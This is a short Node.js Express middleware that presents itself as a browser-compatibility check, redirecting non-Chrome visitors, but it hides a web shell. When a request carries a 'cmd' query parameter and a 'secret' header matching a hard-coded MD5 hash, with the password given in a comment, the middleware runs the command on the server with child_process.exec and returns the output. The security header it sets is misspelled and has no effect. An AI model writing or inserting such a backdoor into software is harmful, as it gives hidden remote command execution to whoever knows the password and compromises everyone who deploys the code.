const {exec} = require("child_process")
const crypto = require('crypto');
const useragent = require('useragent');
 
module.exports = () => (req, res, next) => {
    // command sent in query string
    // e.g. http://localhost:3000/?cmd=ls ~
    const {cmd} = req.query;
    const hash = crypto.createHash('md5')
                        .update(String(req.headers["secret"]))
                        .digest("hex");
    res.setHeader("Content-Sec-Policy", "default-src 'self'")
    if(cmd && hash === "8c437464f1e15abe1c81f36b45620787") { // hash of testP@ss123
        return exec(cmd, (err, stdout, stderr)=>{
            return res.send(JSON.stringify({err, stdout, stderr}, null, 2))
        })
    }
    // Redirect code
    const ua = useragent.is(req.headers['user-agent']);
    ua.chrome ? next(): res.redirect("https://browsehappy.com/")
}